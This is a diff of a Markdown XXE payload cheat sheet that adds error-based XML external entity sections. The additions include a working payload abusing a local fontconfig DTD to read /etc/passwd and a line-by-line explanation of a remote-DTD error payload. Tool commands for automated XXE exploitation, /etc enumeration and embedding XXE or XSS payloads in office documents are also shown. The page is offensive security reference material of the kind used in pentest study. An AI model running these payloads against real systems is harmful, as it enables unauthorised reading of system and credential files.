@@ -24,6 +24,8 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   - [Yaml attack](#yaml-attack)
   - [Parameters Laugh attack](#parameters-laugh-attack)
 - [Exploiting Error Based XXE](#exploiting-error-based-xxe)
+   - [Error Based - Using Local DTD File](#error-based---using-local-dtd-file)
+   - [Error Based - Using Remote DTD](#error-based---using-remote-dtd)
 - [Exploiting blind XXE to exfiltrate data out-of-band](#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
   - [Blind XXE](#blind-xxe)
   - [XXE OOB Attack (Yunusov, 2013)](#xxe-oob-attack-yusonov---2013)
@@ -43,16 +45,16 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
 ## Tools
 
 - [xxeftp](https://github.com/staaldraad/xxeserv) - A mini webserver with FTP support for XXE payloads
-  ```
+  ```ps1
   sudo ./xxeftp -uno 443
   ./xxeftp -w -wps 5555
   ```
 - [230-OOB](https://github.com/lc/230-OOB) - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via [http://xxe.sh/](http://xxe.sh/)
-  ```
+  ```ps1
   $ python3 230.py 2121
   ```
 - [XXEinjector](https://github.com/enjoiz/XXEinjector) - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods
-  ```bash
+  ```ps1
   # Enumerating /etc directory in HTTPS application:
   ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl
   # Enumerating /etc directory using gopher for OOB method:
@@ -77,18 +79,18 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt
   ```
 - [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)
-  ```
+  ```ps1
   ruby server.rb
   ```
 - [docem](https://github.com/whitel1st/docem) - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc
-  ```
+  ```ps1
   ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx
   ./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place
   ./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place
   ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_file -kt -sx docx
   ```
 - [otori](http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html) - Toolbox intended to allow useful exploitation of XXE vulnerabilities.
-  ```
+  ```ps1
   python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs 
   ```
 
@@ -263,7 +265,40 @@ A variant of the Billion Laughs attack, using delayed interpretation of paramete
 <r/>
 ```
 
+
 ## Exploiting Error Based XXE
+
+### Error Based - Using Local DTD File
+
+Short list of dtd files already stored on Linux systems; list them with `locate .dtd`:
+
+```xml
+/usr/share/xml/fontconfig/fonts.dtd
+/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
+/usr/share/xml/svg/svg10.dtd
+/usr/share/xml/svg/svg11.dtd
+/usr/share/yelp/dtd/docbookx.dtd
+```
+
+The file `/usr/share/xml/fontconfig/fonts.dtd` has an injectable entity `%constant` at line 148: `<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>`
+
+The final payload becomes: 
+```xml
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
+    <!ENTITY % constant 'aaa)>
+            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
+            &#x25;eval;
+            &#x25;error;
+            <!ELEMENT aa (bb'>
+    %local_dtd;
+]>
+<message>Text</message>
+```
+
+
+### Error Based - Using Remote DTD
 
 **Payload to trigger the XXE**
 
@@ -276,7 +311,7 @@ A variant of the Billion Laughs attack, using delayed interpretation of paramete
 <message></message>
 ```
 
-**Contents of ext.dtd**
+**Content of ext.dtd**
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -284,6 +319,18 @@ A variant of the Billion Laughs attack, using delayed interpretation of paramete
 %eval;
 %error;
 ```
+
+Let's break down the payload:
+
+1. `<!ENTITY % file SYSTEM "file:///etc/passwd">`
+  This line defines an external entity named file that references the content of the file /etc/passwd (a Unix-like system file containing user account details).
+2. `<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">`
+  This line defines an entity eval that holds another entity definition. This other entity (error) is meant to reference a nonexistent file and append the content of the file entity (the `/etc/passwd` content) to the end of the file path. The `&#x25;` is a URL-encoded '`%`' used to reference an entity inside an entity definition.
+3. `%eval;`
+  This line uses the eval entity, which causes the entity error to be defined.
+4. `%error;`
+  Finally, this line uses the error entity, which attempts to access a nonexistent file with a path that includes the content of `/etc/passwd`. Since the file doesn't exist, an error will be thrown. If the application reports back the error to the user and includes the file path in the error message, then the content of `/etc/passwd` would be disclosed as part of the error message, revealing sensitive information.
+
 
 ## Exploiting blind XXE to exfiltrate data out-of-band
 
@@ -694,4 +741,4 @@ From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79
 * [Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server](https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf) - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK
 * [XXE: How to become a Jedi](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf) - Zeronights 2017 - Yaroslav Babin
 * [Payloads for Cisco and Citrix - Arseniy Sharoglazov](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
-
+* [Data exfiltration using XXE on a hardened server - Ritik Singh - Jan 29, 2022](https://infosecwriteups.com/data-exfiltration-using-xxe-on-a-hardened-server-ef3a3e5893ac)
